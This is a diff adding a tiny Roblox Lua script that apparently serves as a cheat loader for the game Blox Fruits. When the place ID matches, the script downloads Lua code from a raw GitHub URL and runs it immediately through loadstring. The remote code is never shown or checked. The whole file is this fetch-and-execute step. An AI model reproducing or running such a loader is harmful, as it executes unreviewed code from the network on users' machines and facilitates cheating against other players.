@@ -1,0 +1,5 @@
+print("Script Executed!")
+task.wait(1)
+if game.PlaceId == 118109254120801 then 
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/exort12/ahaha/refs/heads/main/Blox%20Fruits%20But%20Very%20Good'))()
+end
